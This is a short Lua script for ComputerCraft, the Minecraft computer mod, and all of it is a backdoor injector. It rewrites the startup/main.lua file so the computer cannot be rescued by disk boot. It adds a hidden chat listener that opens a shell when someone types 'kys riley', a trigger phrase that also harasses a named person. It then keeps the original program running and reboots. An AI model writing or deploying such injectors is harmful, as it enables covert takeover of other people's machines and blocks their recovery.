local file = fs.open("./startup/main.lua","r")
local file_data = file.readAll()
file.close()
local exec = "local function c() while true do settings.set('shell.allow_disk_startup',false) end end local function a() while true do local event, username, message, uuid, isHidden = os.pullEvent('chat') if message == 'kys riley' then shell.run('shell') end end end local function b() "

local new_file = exec.."\n"..file_data.." \nend \nparallel.waitForAll(a,b,c)"
file = fs.open("./startup/main.lua","w")
file.write(new_file)
file.close()
os.reboot()